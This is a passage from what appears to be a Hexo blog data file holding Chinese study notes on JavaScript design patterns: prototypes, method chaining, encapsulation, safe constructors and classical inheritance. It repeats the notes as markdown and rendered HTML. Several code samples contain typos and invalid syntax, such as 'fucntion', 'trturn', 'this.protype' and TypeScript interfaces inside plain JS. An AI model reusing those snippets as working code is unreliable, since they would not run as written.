通过`new`关键字 实例化对象 时，执行了一遍`类`的函数，里面通过调用`特权方法`，初始化对象的一些属性。\n5. `类`外部通过 点语法 定义 属性/方法: 通过`new`关键字创建新对象时，由于`类`外面通过 点语法 定义的`属性/方法`没有执行到，所以 `新创建对象中无法获取`，但可通过`类`来使用，因此在类外面通过 点语法 定义的 属性/方法 被称为 `类的静态公有属性/静态公有方法`\n6. `类`通过`prototype`创建的`属性/方法`在`类实例对象`中可通过this访问(新创建对象_proto_指向类的原型所指向的对象), 所以将`prototype`对象中`属性/方法`称为`公有属性/公有方法`\n\n````\n// 类静态公有属性(实例对象不能访问)\nBook.isChinese = true;\n// 类静态公有方法(实例对象不能访问)\nBook.fn1 = function(){};\n\nBook.prototype = {\n  // 公有属性\n  isBook: false,\n  // 公有方法\n  fn2: function() {}\n}\n````\n\n通过`new`关键字创建的对象 **实质** 是对 新对象`this`的不断赋值，并将prototype指向 类的prototype 所指向的对象。\n\n类的构造函数 外，通过点语法定义的属性/方法 是不会添加到 新创建 对象上去的。\n\n想要在新创建对象中使用静态公有属性，得通过 类本身，不能通过this。\n\n类的原型上定义的属性在 新对象里 可直接使用，因为 新对象 prototype和 类 的 prototype 指向同一对象\n\n类私有属性 和 静态方法 在 实例对象中访问不到\n\n公有属性在实例对象中可通过 点语法 访问到\n\n### 2.2.3 闭包实现\n类的静态变量 通过闭包实现\n\n### 2.2.4 创建对象的安全模式\n````\n// 创建一个图书类\nvar Book = function(title, time, type) {\n  this.title = title;\n  this.time = time;\n  this.type = type;\n}\n\n// 实例化一本书\nvar book1 = Book('js', '2018', 'js')\n\nconsole.log(book); // undefined\n\nconsole.log(window.title);  // js\nconsole.log(window.time);   // 2018\nconsole.log(window.type);   // js\n````\n总结：\n1. new关键字作用 可看做 对当前对象 this 不停赋值，例中 没有用new, 直接执行函数在全局作用域，this指向 全局变量window;\n2. 变量book 最终作用 得到Book类(函数)执行结果, 函数没有return语句, 变量book 得不到 Book类 的返回值, 遂为 undefined\n\n**安全模式 || 检察长模式**\n````\nvar Book = function(title, time, type) {\n  // 判断执行过程中 this 是否为 当前对象(为true说明是用 new关键字 创建)\n  if(this instanceof Book){\n    this.title = title;\n    this.time = time;\n    this.type = type;\n  } else {\n    // 否则重新创建对象并返回\n    return new Book(title, time, type);\n  }\n}\n````\n总结：\n每个类有 3部分\n1. 第一部分是构造函数内，供实例化对象复制\n2. 第二部分是构造函数外，直接通过点语法添加，供类直接使用，实例化对象访问不到\n3. 第三部分是类的原型中，实例化对象可通过原型链间接访问，为所有实例化对象共用\n\n## 2.3 继承\n\n### 2.3.1 子类原型对象--类式继承\n**类式继承**\n````\n// 声明父类\nfunction SuperClass() {\n  this.superValue = true;\n};\n\n// 为父类添加公有方法\nSuperClass.prototype.getSuperValue = function() {\n  return this.superValue;\n};\n\n// 声明子类\nfunction SubClass() {\n  this.subValue = false;\n}\n\n// 继承父类\nSubClass.prototype = new SuperClass();\n// 先继承，再为子类添加公有方法\nSubClass.prototype.getSubValue = function() {\n  return this.subValue;\n}\n\n// 以上 类似`封装`的过程\n````\n总结：\n类式继承 需要将 第一个类的实例 赋值给 第二个 类的原型\\\n类的原型对象 作用是 为类的原型添加公有方法，类不能直接访问原型中的`属性/方法`，必须通过 原型prototype 来访问。\\\n实例化一个父类时，新创建对象复制了父类构造函数内 属性/方法， 并且将 原型_proto_ 指向父类原型对象， 如此便拥有 父类 原型对象/构造函数 上 属性/方法，\n\n**instanceof判断`对象`与`类`继承关系**\\\n`instanceof`通过判断对象`prototype链`来确定`对象`是否为`某类`实例，不关心`对象`与`类`自身结构\n> console.log(obj instanceof Class); // true\n> console.log(SubClass instanceof ParentClass); // false\n\ninstanceof 判断 前面对象是否为 后面 类(对象)实例，不表示两者的继承\\\n子类 继承 父类 时通过将 父类实例 赋值给 子类原型prototype, 子类原型 继承 父类 \n> console.log(SubClass.prototype instanceof ParentClass); // true\n\n所有`对象`都继承自`Object`原生对象构造函数\n> console.log(allObj instanceof Object); // true\n\n#### 类式继承缺点\n1. `子类`通过`原型prototype`对`父类实例化`, 继承父类。\n","source":"_posts/FrontEnd/JS/JS设计模式.md","raw":"---\ntitle: JS设计模式\ndate: 2018-10-05 18:30:43\ntags: 设计模式\ncategories: JavaScript\n---\n# **第一章 灵活语言--JavaScript**\n\n## **1.1 全局变量 命名函数**\n> function fnName() {}\n\n## **1.2 全局变量 函数表达式**\n> var fnName = function() {}\n\nps：全局变量污染全局作用域，容易被覆盖\n\n## **1.3 对象收编变量**\n````\nvar fnObj = {\n  fn1: function() {},\n  fn2: () => {}\n}\n````\n\n## **1.4 对象另一种形式**\nJS万事万物皆对象，函数也是对象\n\n首先声明一个对象, 然后添加方法\n````\nvar fnObj = function() {};\nfnObj.fn1 = function() {};\n````\nps: 对象不能复制, `new` 关键字 创建新对象，新对象不能继承方法\n\n## **1.5真假对象**\n简单复制，将方法放在一个函数对象中\n````\nvar fnObj = function() {\n  return {\n    fn1: function() {},\n    fn2: () => {}\n  }\n}\n\nvar a = fnObj();\na.fn1();\n````\nps: 每次调用返回新对象, 状态不会互相干扰 / 新创建对象 和 `fnObj` 没有任何关系\n\n## **1.6 类**\n`1.5假对象`新创建对象 和`fnObj`没有任何关系\n````\nvar fnObj = function() {\n  this.fn1 = function(){}\n  this.fn2 = () => {}\n  this.fn3 = arguments => {}\n}\n\nvar a = new fnObj();\na.fn1();\n````\n用类创建对象\n\n## **1.7 检测类**\n所有方法放在 函数内部 通过`this`定义。\\\n每次通过`new`关键字创建新对象，`新对象`对`类`的`this`上的`属性/方法`进行复制。新创建对象 都有自己的一套方法，**但是**造成的消耗很奢侈。\n\n**第一种方法**\n````\nvar fnObj = function() {};\nfnObj.prototype.fn1 = function() {};\nfnObj.prototype.fn2 = () => {};\n````\n\n实例 共享`prototype`上`属性/方法`\n\n**第二种方法**\n````\nvar fnObj = function() {};\n\nfnObj.prototype = {\n  fn1: function() {},\n  fn2: () => {}\n}\n````\n两种方法不能混用，第二种覆盖第一种.\n\n## **1.8 方法的链式调用**\n在声明的 每个方法末尾 将当前对象返回，JS中`this`关键字指向当前对象\n````\nvar fnObj = {\n  fn1: function() {\n    // DoSomeThing\n    return this;\n  },\n  fn2: () => {\n    // DoSomeThing \n    return this;\n  }\n}\n\n// 链式调用\n> fnObj.fn1().fn2();\n````\n\n**构造函数原型链式调用**\n````\nvar fnObj = function() {};\n\nfnObj.prototype = {\n  fn1: function() {\n    // DoSomeThing\n    return this;\n  },\n  fn2: () => {\n    // DoSomeThing\n    return this;\n  }\n}\n\n// 使用时需要先创建一下\nvar a = new fnObj();\na.fn1().fn2();\n````\n\n## 1.9 函数祖先\n`prototype.js / lodash.js`, `js框架`;\n\n在内置对象`Function`原型上添加方法\n> Function.prototype.fn1 = fucntion() {}\n\n// 函数形式\n> var f = function() {};\n> f.fn1();\n\n// 构造函数\n> var f = new Function();\n> f.fn1();\n\n此种方法不被推荐，污染原生对象`Function`, 可抽象出一个 统一添加方法的 功能方法\n\n````\n// 在原型上挂载`addMethod`方法\nFunction.prototype.addMethod = function(name, fn) {\n  this[name] = fn;\n}\n\n// 两种生成实例的方法，任选其一\nvar methods = function() {};\n||\nvar methods = new Function();\n\nmethods.addMethod('fn1', function() {});\nmethods.addMethod('fn2', function() {});\n\nmethods.fn1();\nmethods.fn2();\n````\n\n## 1.10链式添加\n````\n// 在原型上挂载`addMethod`方法\nFunction.prototype.addMethod = function(name, fn) {\n  this[name] = fn;\n  return this;\n}\n\n// 顺便支持`链式调用`\nvar fn = function() {};\nfn.addMethod('fn1', function() {\n  return this;\n}).addMethod('fn2', function() {\n    return this;\n  })\n\nfn.fn1().fn2();\n````\n\n## 1.11 类式调用\n````\n// 在原型上挂载`addMethod`方法\nFunction.prototype.addMethod = function(name, fn) {\n  this.prototype[name] = fn;\n  return this;\n}\n\n// 顺便支持`链式调用`\nvar fn = function() {};\nfn.addMethod('fn1', function() {\n  return this;\n}).addMethod('fn2', function() {\n    return this;\n  })\n\n// 调用时需要注意\nvar fns = new fn();\nfns.fn1();\n````\n\n## **总结:** \nJS是一种`灵活`的语言, `函数`扮演一等公民。使用JS可以编写出更多`优雅的艺术代码`。\n\n**忆之获:** 函数 多样化 创建/使用. `灵活性`是语言特有气质。团队开发慎重，尽量保证团队代码风格一致。易开发、可维护、代码规范必然要求。\n\n**问答:**\n\n+ **问： [1.5真假对象](#1.5真假对象) 一节中如何实现方法链式调用?**\\\n  答：\n  ````\n  var fnObj = function() {\n    return {\n      fn1: function() {\n        return this;\n      },\n      fn2: () => {\n        return this;\n      }\n    }\n  }\n\n  var fn = fnObj();\n  fn.fn1().fn2();\n  ````\n\n+ **问：试定义一个可为函数添加多方法的`addMethod`方法。**\\\n  答：参考[1.10链式添加](#1.10链式添加)\n\n  **方式一**\n  ````\n  // 在原型上挂载`addMethod`方法\n  Function.prototype.addMethod = function(name, fn) {\n    this[name] = fn;\n    return this;\n  }\n\n  // 顺便支持`链式调用`\n  var fn = function() {};\n  fn.addMethod('fn1', function() {\n    return this;\n  }).addMethod('fn2', function() {\n      return this;\n    })\n\n  fn.fn1().fn2();\n  ````\n\n  **方式二**\n  ````\n  // 定义 参数类型 接口\n  interface opt = {\n    fnName: string,\n    fn: function\n  }\n\n  // 支持 一次性 创建多个方法\n  Function.prototype.addMethod = function(options: opt[]) {\n    for(obj of options) {\n      this[obj.fnName] = obj.fn;\n    }\n    trturn this;\n  }\n\n  var methods = [\n    {\n      fnName: 'fn1',\n      fn: function() {}\n    },\n    {\n      fnName: 'fn2',\n      fn: () => {}\n    }\n    ...\n  ]\n\n  var '自定义Fn' = function() {};\n\n  '自定义Fn'.addMethod(methods);\n  ````\n\n+ **问：试定义一个既可为函数添加多方法,又可为原型添加方法的`addMethod`方法。**\\\n  答：\n  ````\n  // 定义 参数类型 接口\n  interface opt = {\n    fnName: string,\n    fn: function\n  }\n\n  // 支持 一次性 创建多个方法\n  Function.prototype.addMethod = function(options: opt[], proto: string) {\n    if(proto === \"prototype\") {\n      for(obj of options) {\n        this.protype[obj.fnName] = obj.fn;\n      }\n    } else {\n      for(obj of options) {\n        this[obj.fnName] = obj.fn;\n      }\n    }\n    trturn this;\n  }\n  ````\n\n# **第二章 面向对象编程**\n\n## 2.1 `面向对象` `面向过程`\n面向对象编程 就是 将 需求 抽象成一个对象, 针对对象分析 特征(属性) / 动作(方法). 这个对象称为`类`.\n\n**核心思想：**`封装` `继承` `多继承` `多态`\n\n## 2.2 包装明星--封装\n\n### 2.2.1 创建一个类\n首先声明一个函数，保存在一个变量里. 按编程习惯，将类名首字母大写.\n然后在函数(类)内部通过对`this`(函数内部自带变量，用于指向当前对象)变量添加 属性/方法，实现对类添加`属性/方法`\n````\nvar Book = function(id, bookName, price) {\n  this.id = id;\n  this.bookName = bookName;\n  this.price = price;\n}\n````\n\n也可通过`类`的原型(类本身也是对象，所以也有原型`prototype`)上添加`属性/方法`.\\\n两种方式：\n\n①为原型对象属性赋值\n````\nBook.prototype.show = function() {};\n````\n\n②将一个对象赋值给类的原型对象.\n````\nBook.prototype = {\n  show: function() {},\n  fn2: function() {},\n}\n````\n两种模式不能混用\n\n使用时需要`new`关键字，实例化(创建)新对象.\n\n**关于对实例方法和原型方法解释：**\n通过`this`添加的`方法/属性`，是在当前对象上添加的\\\nJS是一种基于`prototype`原型的语言, 每创建一个对象(函数也是一种对象),都有一个prototype原型用于指向 其继承的 属性/方法. 通过prototype继承方法非对象自身所有，需要通过prototype逐级查找。\n通过`this`定义的`方法/属性`，是对象自身拥有, 每次通过`类`创建新对象实例时，都会复制`类`本身方法、属性\\\nprototype上方法/属性是继承来,状态共享, 不会被多次创建。\n\n### 2.2.2 属性与方法封装\n理解：\n1. 通过JS函数作用域 实现 函数内部创建\n面向对象思想:\n\n `属性/方法` 的 隐藏、暴露, `私有属性/私有方法、公有属性/公有方法、保护属性/保护方法`\n\nJS通过`函数作用域`实现`私有属性/私有方法`;\n\n`this`创建`公有属性/公有方法`, 通过`this`创建的公有方法，可以访问`类(创建时)||对象`的`私有属性/私有方法`, 由于这些方法权利比较大, 又称为`特权方法`;\n````\n// 私有属性/私有方法, 特权方法, 对象公有属性/对象公有方法, 构造器\nvar Book = fucntion(id, name, price) {\n  // 私有属性\n  var num = 1;\n  // 私有方法\n  function checkId() {};\n  \n  // 特权方法\n  this.getName = function() {};\n  this.getPrice = function() {};\n  this.setName = function() {};\n  this.setPrice = function() {};\n\n  // 对象公有属性\n  this.id = id;\n  // 对象公有方法\n  this.copy = function() {};\n\n  // 构造器\n  this.setName(name);\n  this.setPrice(price);\n}\n````\n理解：\n1. 通过JS`函数作用域`特征，来实现 函数内部创建 外部无法访问的`私有变量/私有方法`\n2. 通过`new`关键字，实例化对象时，会对`类`执行一次，所以`类`内部`this`上定义的`属性/方法`自然可复制到 新创建对象上，成为 `对象公有属性/公有方法` \n3. 其中一些方法能访问到 `类`的`私有属性/私有方法`, 比外界权利大，得名`特权方法`\n4. 通过`new`关键字 实例化对象 时，执行了一遍`类`的函数，里面通过调用`特权方法`，初始化对象的一些属性。\n5. `类`外部通过 点语法 定义 属性/方法: 通过`new`关键字创建新对象时，由于`类`外面通过 点语法 定义的`属性/方法`没有执行到，所以 `新创建对象中无法获取`，但可通过`类`来使用，因此在类外面通过 点语法 定义的 属性/方法 被称为 `类的静态公有属性/静态公有方法`\n6. `类`通过`prototype`创建的`属性/方法`在`类实例对象`中可通过this访问(新创建对象_proto_指向类的原型所指向的对象), 所以将`prototype`对象中`属性/方法`称为`公有属性/公有方法`\n\n````\n// 类静态公有属性(实例对象不能访问)\nBook.isChinese = true;\n// 类静态公有方法(实例对象不能访问)\nBook.fn1 = function(){};\n\nBook.prototype = {\n  // 公有属性\n  isBook: false,\n  // 公有方法\n  fn2: function() {}\n}\n````\n\n通过`new`关键字创建的对象 **实质** 是对 新对象`this`的不断赋值，并将prototype指向 类的prototype 所指向的对象。\n\n类的构造函数 外，通过点语法定义的属性/方法 是不会添加到 新创建 对象上去的。\n\n想要在新创建对象中使用静态公有属性，得通过 类本身，不能通过this。\n\n类的原型上定义的属性在 新对象里 可直接使用，因为 新对象 prototype和 类 的 prototype 指向同一对象\n\n类私有属性 和 静态方法 在 实例对象中访问不到\n\n公有属性在实例对象中可通过 点语法 访问到\n\n### 2.2.3 闭包实现\n类的静态变量 通过闭包实现\n\n### 2.2.4 创建对象的安全模式\n````\n// 创建一个图书类\nvar Book = function(title, time, type) {\n  this.title = title;\n  this.time = time;\n  this.type = type;\n}\n\n// 实例化一本书\nvar book1 = Book('js', '2018', 'js')\n\nconsole.log(book); // undefined\n\nconsole.log(window.title);  // js\nconsole.log(window.time);   // 2018\nconsole.log(window.type);   // js\n````\n总结：\n1. new关键字作用 可看做 对当前对象 this 不停赋值，例中 没有用new, 直接执行函数在全局作用域，this指向 全局变量window;\n2. 变量book 最终作用 得到Book类(函数)执行结果, 函数没有return语句, 变量book 得不到 Book类 的返回值, 遂为 undefined\n\n**安全模式 || 检察长模式**\n````\nvar Book = function(title, time, type) {\n  // 判断执行过程中 this 是否为 当前对象(为true说明是用 new关键字 创建)\n  if(this instanceof Book){\n    this.title = title;\n    this.time = time;\n    this.type = type;\n  } else {\n    // 否则重新创建对象并返回\n    return new Book(title, time, type);\n  }\n}\n````\n总结：\n每个类有 3部分\n1. 第一部分是构造函数内，供实例化对象复制\n2. 第二部分是构造函数外，直接通过点语法添加，供类直接使用，实例化对象访问不到\n3. 第三部分是类的原型中，实例化对象可通过原型链间接访问，为所有实例化对象共用\n\n## 2.3 继承\n\n### 2.3.1 子类原型对象--类式继承\n**类式继承**\n````\n// 声明父类\nfunction SuperClass() {\n  this.superValue = true;\n};\n\n// 为父类添加公有方法\nSuperClass.prototype.getSuperValue = function() {\n  return this.superValue;\n};\n\n// 声明子类\nfunction SubClass() {\n  this.subValue = false;\n}\n\n// 继承父类\nSubClass.prototype = new SuperClass();\n// 先继承，再为子类添加公有方法\nSubClass.prototype.getSubValue = function() {\n  return this.subValue;\n}\n\n// 以上 类似`封装`的过程\n````\n总结：\n类式继承 需要将 第一个类的实例 赋值给 第二个 类的原型\\\n类的原型对象 作用是 为类的原型添加公有方法，类不能直接访问原型中的`属性/方法`，必须通过 原型prototype 来访问。\\\n实例化一个父类时，新创建对象复制了父类构造函数内 属性/方法， 并且将 原型_proto_ 指向父类原型对象， 如此便拥有 父类 原型对象/构造函数 上 属性/方法，\n\n**instanceof判断`对象`与`类`继承关系**\\\n`instanceof`通过判断对象`prototype链`来确定`对象`是否为`某类`实例，不关心`对象`与`类`自身结构\n> console.log(obj instanceof Class); // true\n> console.log(SubClass instanceof ParentClass); // false\n\ninstanceof 判断 前面对象是否为 后面 类(对象)实例，不表示两者的继承\\\n子类 继承 父类 时通过将 父类实例 赋值给 子类原型prototype, 子类原型 继承 父类 \n> console.log(SubClass.prototype instanceof ParentClass); // true\n\n所有`对象`都继承自`Object`原生对象构造函数\n> console.log(allObj instanceof Object); // true\n\n#### 类式继承缺点\n1. `子类`通过`原型prototype`对`父类实例化`, 继承父类。\n","slug":"FrontEnd/JS/JS设计模式","published":1,"updated":"2018-10-07T13:13:59.542Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzl009gzodvdx6wausp","content":"<h1 id=\"第一章-灵活语言–JavaScript\"><a href=\"#第一章-灵活语言–JavaScript\" class=\"headerlink\" title=\"第一章 灵活语言–JavaScript\"></a><strong>第一章 灵活语言–JavaScript</strong></h1><h2 id=\"1-1-全局变量-命名函数\"><a href=\"#1-1-全局变量-命名函数\" class=\"headerlink\" title=\"1.1 全局变量 命名函数\"></a><strong>1.1 全局变量 命名函数</strong></h2><blockquote>\n<p>function fnName() {}</p>\n</blockquote>\n<h2 id=\"1-2-全局变量-函数表达式\"><a href=\"#1-2-全局变量-函数表达式\" class=\"headerlink\" title=\"1.2 全局变量 函数表达式\"></a><strong>1.2 全局变量 函数表达式</strong></h2><blockquote>\n<p>var fnName = function() {}</p>\n</blockquote>\n<p>ps：全局变量污染全局作用域，容易被覆盖</p>\n<h2 id=\"1-3-对象收编变量\"><a href=\"#1-3-对象收编变量\" class=\"headerlink\" title=\"1.3 对象收编变量\"></a><strong>1.3 对象收编变量</strong></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = &#123;</span><br><span class=\"line\">  fn1: function() &#123;&#125;,</span><br><span class=\"line\">  fn2: () =&gt; &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-4-对象另一种形式\"><a href=\"#1-4-对象另一种形式\" class=\"headerlink\" title=\"1.4 对象另一种形式\"></a><strong>1.4 对象另一种形式</strong></h2><p>JS万事万物皆对象，函数也是对象</p>\n<p>首先声明一个对象, 然后添加方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;&#125;;</span><br><span class=\"line\">fnObj.fn1 = function() &#123;&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>ps: 对象不能复制, <code>new</code> 关键字 创建新对象，新对象不能继承方法</p>\n<h2 id=\"1-5真假对象\"><a href=\"#1-5真假对象\" class=\"headerlink\" title=\"1.5真假对象\"></a><strong>1.5真假对象</strong></h2><p>简单复制，将方法放在一个函数对象中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;</span><br><span class=\"line\">  return &#123;</span><br><span class=\"line\">    fn1: function() &#123;&#125;,</span><br><span class=\"line\">    fn2: () =&gt; &#123;&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = fnObj();</span><br><span class=\"line\">a.fn1();</span><br></pre></td></tr></table></figure></p>\n<p>ps: 每次调用返回新对象, 状态不会互相干扰 / 新创建对象 和 <code>fnObj</code> 没有任何关系</p>\n<h2 id=\"1-6-类\"><a href=\"#1-6-类\" class=\"headerlink\" title=\"1.6 类\"></a><strong>1.6 类</strong></h2><p><code>1.5假对象</code>新创建对象 和<code>fnObj</code>没有任何关系<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;</span><br><span class=\"line\">  this.fn1 = function()&#123;&#125;</span><br><span class=\"line\">  this.fn2 = () =&gt; &#123;&#125;</span><br><span class=\"line\">  this.fn3 = arguments =&gt; &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = new fnObj();</span><br><span class=\"line\">a.fn1();</span><br></pre></td></tr></table></figure></p>\n<p>用类创建对象</p>\n<h2 id=\"1-7-检测类\"><a href=\"#1-7-检测类\" class=\"headerlink\" title=\"1.7 检测类\"></a><strong>1.7 检测类</strong></h2><p>所有方法放在 函数内部 通过<code>this</code>定义。\\<br>每次通过<code>new</code>关键字创建新对象，<code>新对象</code>对<code>类</code>的<code>this</code>上的<code>属性/方法</code>进行复制。新创建对象 都有自己的一套方法，<strong>但是</strong>造成的消耗很奢侈。</p>\n<p><strong>第一种方法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;&#125;;</span><br><span class=\"line\">fnObj.prototype.fn1 = function() &#123;&#125;;</span><br><span class=\"line\">fnObj.prototype.fn2 = () =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>实例 共享<code>prototype</code>上<code>属性/方法</code></p>\n<p><strong>第二种方法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">fnObj.prototype = &#123;</span><br><span class=\"line\">  fn1: function() &#123;&#125;,</span><br><span class=\"line\">  fn2: () =&gt; &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>两种方法不能混用，第二种覆盖第一种.</p>\n<h2 id=\"1-8-方法的链式调用\"><a href=\"#1-8-方法的链式调用\" class=\"headerlink\" title=\"1.8 方法的链式调用\"></a><strong>1.8 方法的链式调用</strong></h2><p>在声明的 每个方法末尾 将当前对象返回，JS中<code>this</code>关键字指向当前对象<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = &#123;</span><br><span class=\"line\">  fn1: function() &#123;</span><br><span class=\"line\">    // DoSomeThing</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  fn2: () =&gt; &#123;</span><br><span class=\"line\">    // DoSomeThing </span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 链式调用</span><br><span class=\"line\">&gt; fnObj.fn1().fn2();</span><br></pre></td></tr></table></figure></p>\n<p><strong>构造函数原型链式调用</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">fnObj.prototype = &#123;</span><br><span class=\"line\">  fn1: function() &#123;</span><br><span class=\"line\">    // DoSomeThing</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  fn2: () =&gt; &#123;</span><br><span class=\"line\">    // DoSomeThing</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 使用时需要先创建一下</span><br><span class=\"line\">var a = new fnObj();</span><br><span class=\"line\">a.fn1().fn2();</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"1-9-函数祖先\"><a href=\"#1-9-函数祖先\" class=\"headerlink\" title=\"1.9 函数祖先\"></a>1.9 函数祖先</h2><p><code>prototype.js / lodash.js</code>, <code>js框架</code>;</p>\n<p>在内置对象<code>Function</code>原型上添加方法</p>\n<blockquote>\n<p>Function.prototype.fn1 = fucntion() {}</p>\n</blockquote>\n<p>// 函数形式</p>\n<blockquote>\n<p>var f = function() {};<br>f.fn1();</p>\n</blockquote>\n<p>// 构造函数</p>\n<blockquote>\n<p>var f = new Function();<br>f.fn1();</p>\n</blockquote>\n<p>此种方法不被推荐，污染原生对象<code>Function</code>, 可抽象出一个 统一添加方法的 功能方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 在原型上挂载`addMethod`方法</span><br><span class=\"line\">Function.prototype.addMethod = function(name, fn) &#123;</span><br><span class=\"line\">  this[name] = fn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 两种生成实例的方法，任选其一</span><br><span class=\"line\">var methods = function() &#123;&#125;;</span><br><span class=\"line\">||</span><br><span class=\"line\">var methods = new Function();</span><br><span class=\"line\"></span><br><span class=\"line\">methods.addMethod(&apos;fn1&apos;, function() &#123;&#125;);</span><br><span class=\"line\">methods.addMethod(&apos;fn2&apos;, function() &#123;&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">methods.fn1();</span><br><span class=\"line\">methods.fn2();</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-10链式添加\"><a href=\"#1-10链式添加\" class=\"headerlink\" title=\"1.10链式添加\"></a>1.10链式添加</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 在原型上挂载`addMethod`方法</span><br><span class=\"line\">Function.prototype.addMethod = function(name, fn) &#123;</span><br><span class=\"line\">  this[name] = fn;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 顺便支持`链式调用`</span><br><span class=\"line\">var fn = function() &#123;&#125;;</span><br><span class=\"line\">fn.addMethod(&apos;fn1&apos;, function() &#123;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;).addMethod(&apos;fn2&apos;, function() &#123;</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">fn.fn1().fn2();</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-11-类式调用\"><a href=\"#1-11-类式调用\" class=\"headerlink\" title=\"1.11 类式调用\"></a>1.11 类式调用</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td 